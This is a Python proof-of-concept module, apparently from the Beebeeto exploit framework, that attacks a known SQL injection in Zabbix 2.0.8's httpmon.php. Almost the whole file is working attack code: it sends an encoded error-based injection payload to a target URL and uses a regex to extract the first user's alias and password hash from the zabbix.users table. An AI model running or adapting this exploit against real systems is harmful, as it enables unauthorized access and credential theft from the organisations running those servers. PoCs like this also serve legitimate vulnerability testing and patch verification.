#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        'poc': {
            'id': 'poc-2014-0002',
            'name': 'Zabbix /httpmon.php sql injection',
            'author': 'windows95',
            'create_date': '2014-08-15',
        },
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        'vul': {
            'app_name': 'zabbix',
            'vul_version': ['2.0.8'],
            'type': 'SQL Injection',
            'tag': ['zabbix', 'sql', 'SQL注入漏洞'],
            'desc': 'zabbix has a sql injection  vulnerability in httpmon.php',
            'references': ['http://drops.wooyun.org/papers/680',
                           ],
        },
    }


    @classmethod
    def exploit(cls, args):  # 实现exploit模式的主函数
        payload = "/httpmon.php?applications=2%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%28select%20concat%28cast%28concat%28alias,0x7e,passwd,0x7e%29%20as%20char%29,0x7e%29%29%20from%20zabbix.users%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29"
        response = urllib2.urlopen(args['options']['target'] + payload)
        content = response.read()
        reg = re.compile("Duplicate entry '(.*?)~~1' for key")
        res = reg.findall(content)
        if res and "web.httpmon.applications" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = args['options']['target'] + payload
            args['poc_ret']['password'] = res[0]
            return args
        else:
            args['success'] = False
            return args

    verify = exploit

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
